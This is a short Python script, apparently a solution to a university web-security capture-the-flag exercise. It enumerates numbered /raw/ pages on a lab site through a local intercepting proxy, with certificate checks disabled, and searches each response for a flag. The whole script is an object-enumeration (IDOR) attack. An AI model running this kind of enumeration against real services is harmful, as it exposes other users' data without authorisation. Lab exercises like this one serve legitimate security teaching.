import requests
import re

proxies = {
  'https': 'http://127.0.0.1:8080',
}
def search():
    for i in range(500):
        r = requests.get("https://support-v0.quoccacorp.com/raw/" + str(i), proxies=proxies, verify=False)
        flag = re.search(r"COMP6443\{.*?\}",r.text)
        if flag:
            return flag.group(0)

print(search())